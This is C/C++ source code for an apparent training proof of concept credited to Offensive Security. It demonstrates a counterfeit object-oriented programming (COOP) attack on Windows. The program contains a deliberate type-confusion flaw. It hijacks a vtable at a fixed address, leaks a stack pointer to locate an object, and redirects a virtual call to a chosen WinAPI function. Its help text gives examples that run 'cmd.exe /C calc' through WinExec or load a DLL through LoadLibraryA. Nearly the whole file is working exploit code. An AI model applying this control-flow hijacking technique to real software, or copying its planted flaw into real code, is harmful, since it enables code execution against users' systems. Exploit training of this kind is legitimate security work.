#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include "offsec.cpp"


class Base {};
class Child : public Base {
public:
    virtual void test1();
};

void* CopyString(char* s) {
    void* buf = malloc(16);
    memset(buf, '\x00', 16);
    memcpy((char*)buf, s, 16);
    return buf;
}

void* print_stack_pointer() {
    DWORD64* p = NULL;
    return (DWORD64*)&p;
}

BOOL hexstring_to_bytes(const char* str, BYTE* dest, int dest_size) {
    int len = (int)strlen(str);

    if ((len / 2) > dest_size) {
        return FALSE;
    }

    for (int i = 0; i < len / 2; i++) {
        int v;
        if (sscanf_s(str + i * 2, "%2x", &v) != 1)
            break;
        dest[i] = (unsigned char)v;
    }
    return TRUE;
}

void print_help(char* argv) {
    printf("\n[-] SYNTAX:\n");
    printf("%s <COOP object ptr> <1st vfgadget> <WinAPI> <API argument>\n", argv);
    printf("\n[-] EXAMPLE - WinExec:\n");
    printf("%s 00001e000000 5086014001000000 40610fecfb7f0000 \"cmd.exe /C calc\"\n", argv);
    printf("\n[-] EXAMPLE - LoadLibraryA:\n");
    printf("%s 00001e000000 5086014001000000 f0040becfb7f0000 \"edgehtml.dll\"\n", argv);
}
int main(int argc, char* argv[]) {
    printf("\n[-] COOP Vulnerable Application PoC\n");
    printf("[-] handwritten with keys by uf0\n");
    printf("[-] 2022 - Offensive Security\n");

    if (argc < 5) {
        print_help(argv[0]);
        exit(0);
    }
    system("pause");

    OffSec imported_class;
    BYTE vtable_hijack[8];
    BYTE vfgadget_1[8];
    BYTE winapi[8];

    //unsigned char vtable_hijack[8];
    DWORD64 alloc = (DWORD64)0x1e000000;
    //hexstring_to_bytes(argv[1], vtable_hijack, 8);
    memcpy((DWORD64*)vtable_hijack,&alloc, 8);
    hexstring_to_bytes(argv[2], vfgadget_1, 8);
    hexstring_to_bytes(argv[3], winapi, 8);
    void* buf = CopyString((char*)vtable_hijack);
    Child* child2 = static_cast<Child*>(buf);

    //allocating local buffer for variables
    char* coopbuf = (char*)VirtualAlloc((void*)0x1e000000, 0x8000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    DWORD64 coop = (DWORD64)(coopbuf);
    if (coop == NULL) {
        exit(1);
    }
    printf("\n\t\t\t[*] COOP buffer at: \t\t0x%p", coopbuf);
  
    // setting up COOP chain
    DWORD64 base  = (DWORD64)(coop + 0x50);       // will be overwritte with OffSec::trigger vfgadget
    DWORD64 coop0 = (DWORD64)(coop + 0x58);
    DWORD64 coop1 = (DWORD64)(coop + 0x68);
    DWORD64 coop2 = (DWORD64)(coop + 0x70);
    DWORD64 coop3 = (DWORD64)(coop + 0x78);
    DWORD64 coop4 = (DWORD64)(coop + 0x80);       // vfgadgets function args

    DWORD index = 0;
    memcpy((DWORD64*)coop + index, &base, 8); 
    index += 8;
    memcpy((DWORD64*)coop + index, &coop0, 8);
    index += 8;
    memcpy((DWORD64*)coop + index, &coop1, 8);
    index += 8;
    memcpy((DWORD64*)coop + index, &coop2, 8);
    index += 8;
    memcpy((DWORD64*)coop + index, &coop3, 8);
    index += 8;
    memcpy((DWORD64*)coop + index, &coop4, 8);

    // vtable hijack
    int* ptr_vtable_hijack = (int*)vtable_hijack;
    DWORD64 vtable_address = *ptr_vtable_hijack;
    memcpy((DWORD64*)(vtable_address), (DWORD64*)vfgadget_1, 8);
    
    // retrieving this_ptr via leaked stack
    DWORD64 stack_ptr_leak = (DWORD64)print_stack_pointer();
    printf("\n\t\t\t[*] leaked stack pointer: \t0x%p\n", (PDWORD64)stack_ptr_leak);
    DWORD64* stack_offset = (DWORD64*)(stack_ptr_leak + 0x70);
    DWORD64* this_ptr = (DWORD64*)(*stack_offset);
    DWORD64 function_call = (DWORD64)this_ptr + 0x10;
    DWORD64 function_arg = (DWORD64)this_ptr + 0x8;
    
    // crafting fake COOP object argument
    memcpy((PDWORD64*)(function_call), (DWORD64*)winapi, 8);    //WinAPI
    *(DWORD64*)function_arg = 0x1e000080;
    DWORD64* hijacked = (DWORD64*)0x1e000080;                     //Argument  
    strcpy((char*)(hijacked), argv[4]);
    
    // triggering type confusion
    printf("\t\t\t[*] hijacking flow control: ");
    child2->test1();
    printf("\tOK\n");
    free(buf);
    return 0;
}